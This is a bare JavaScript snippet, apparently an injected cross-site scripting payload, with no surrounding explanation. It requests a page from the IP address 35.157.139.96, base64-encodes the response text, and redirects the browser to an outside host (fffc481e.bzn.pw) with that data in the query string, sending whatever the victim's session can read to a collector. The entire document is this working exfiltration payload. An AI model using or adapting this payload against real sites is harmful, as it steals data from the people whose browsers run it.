var request = new XMLHttpRequest();
request.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        kek=this.responseText;
        var request2 = new XMLHttpRequest();
		document.location.href = 'http://fffc481e.bzn.pw?' + btoa(kek)
    }
};
request.open('GET', 'http://35.157.139.96/issues.php');
request.send();
